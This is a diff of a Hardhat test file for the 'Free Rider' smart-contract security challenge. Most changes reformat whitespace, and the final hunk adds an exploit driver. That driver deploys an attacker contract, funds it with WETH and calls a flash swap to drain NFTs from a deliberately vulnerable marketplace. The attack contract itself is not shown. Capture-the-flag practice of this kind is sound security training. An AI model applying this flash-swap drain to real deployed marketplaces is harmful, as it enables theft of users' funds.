@@ -3,8 +3,8 @@ const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
 const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
 const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");
 
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const {ethers} = require('hardhat');
+const {expect} = require('chai');
 
 describe('[Challenge] Free Rider', function () {
     let deployer, attacker, buyer;
@@ -59,7 +59,7 @@ describe('[Challenge] Free Rider', function () {
             0,                                                          // amountETHMin
             deployer.address,                                           // to
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
-            { value: UNISWAP_INITIAL_WETH_RESERVE }
+            {value: UNISWAP_INITIAL_WETH_RESERVE}
         );
 
         // Get a reference to the created Uniswap pair
@@ -75,7 +75,7 @@ describe('[Challenge] Free Rider', function () {
         // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
         this.marketplace = await (await ethers.getContractFactory('FreeRiderNFTMarketplace', deployer)).deploy(
             AMOUNT_OF_NFTS,
-            { value: MARKETPLACE_INITIAL_ETH_BALANCE }
+            {value: MARKETPLACE_INITIAL_ETH_BALANCE}
         );
 
         // Deploy NFT contract
@@ -99,12 +99,22 @@ describe('[Challenge] Free Rider', function () {
         this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
             attacker.address, // partner
             this.nft.address,
-            { value: BUYER_PAYOUT }
+            {value: BUYER_PAYOUT}
         );
     });
 
-    it.only('Exploit', async function () {
+    it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackerBaseContract = await ethers.getContractFactory('FreeRiderContractor', attacker);
+        // const attackerContract = await attackerBaseContract.deploy(this.uniswapFactory.address, this.uniswapFactory.address,this.uniswapRouter.address);
+        console.log(parseInt(await this.weth.balanceOf(attacker.address), 10));
+        const attackerContract = await attackerBaseContract.connect(attacker).deploy(this.uniswapFactory.address, this.weth.address, this.marketplace.address, this.buyerContract.address);
+        await attackerContract.deployed();
+        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('0.2')});
+        await this.weth.connect(attacker).transfer(attackerContract.address, ethers.utils.parseEther('0.2'))
+        console.log(parseInt(await this.weth.balanceOf(attacker.address), 10));
+        console.log(parseInt(await this.weth.balanceOf(attackerContract.address), 10));
+        await attackerContract.connect(attacker).doFlashSwap([0, 1, 2, 3, 4, 5], this.token.address, ethers.utils.parseEther('45'));
 
     });
 
